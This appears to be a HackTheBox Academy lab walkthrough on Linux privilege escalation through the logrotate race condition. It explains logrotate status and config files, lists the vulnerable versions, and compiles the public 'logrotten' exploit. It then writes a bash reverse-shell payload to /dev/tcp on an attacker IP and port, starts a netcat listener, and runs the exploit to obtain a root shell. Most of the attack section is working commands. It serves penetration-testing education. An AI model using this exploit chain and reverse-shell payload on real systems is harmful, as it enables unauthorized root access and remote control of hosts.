
```shell
3kjS@htb[/htb]$ man logrotate 3kjS@htb[/htb]$ # or 3kjS@htb[/htb]$ logrotate --help
```

To force a new rotation on the same day, we can set the date after the individual log files in the status file `/var/lib/logrotate.status` or use the `-f`/`--force` option:

```shell
3kjS@htb[/htb]$ sudo cat /var/lib/logrotate.status 

/var/log/samba/log.smbd" 2022-8-3 
/var/log/mysql/mysql.log" 2022-8-3
```

We can find the corresponding configuration files in `/etc/logrotate.d/` directory.

```shell
3kjS@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp
```

```shell
3kjS@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}
```

To exploit `logrotate`, we need some requirements that we have to fulfill.

1. we need `write` permissions on the log files
2. logrotate must run as a privileged user or `root`
3. vulnerable versions:
    - 3.8.6
    - 3.11.0
    - 3.15.0
    - 3.18.0

```shell
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git 
logger@nix02:~$ cd logrotten 
logger@nix02:~$ gcc logrotten.c -o logrotten
```

```shell
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

```shell
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#" 

create
```

```shell
3kjS@htb[/htb]$ nc -nlvp 9001 

Listening on 0.0.0.0 9001
```

As a final step, we run the exploit with the prepared payload and wait for a reverse shell as a privileged user or root.

```shell
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log
```
